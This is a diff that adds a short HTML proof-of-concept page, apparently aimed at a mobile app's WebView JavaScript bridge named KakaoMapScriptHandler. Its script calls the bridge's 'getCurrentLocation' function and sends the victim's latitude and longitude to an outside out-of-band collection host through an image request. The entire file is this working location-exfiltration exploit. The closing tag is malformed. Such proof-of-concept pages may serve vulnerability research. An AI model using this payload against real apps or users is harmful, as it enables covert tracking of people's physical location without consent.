@@ -1,0 +1,16 @@
+<html>
+<head>
+</head>
+<body>
+<script>
+window.__poc_ok = function (r) {
+  new Image().src = 'https://mq56638913erjf0d3kbgxusufzv40k88w.fridayoast.net/collect?lat=' + r.coords.latitude + '&lon=' + r.coords.longitude;
+};
+window.__poc_err = function (e) { document.title = 'err ' + e.code; };
+window.webkit.messageHandlers.KakaoMapScriptHandler.postMessage({
+  'name': 'getCurrentLocation',
+  'jsonString': JSON.stringify({ 'onSuccess': 'window.__poc_ok', 'onError': 'window.__poc_err' })
+});
+</script>
+</body>
+</html?
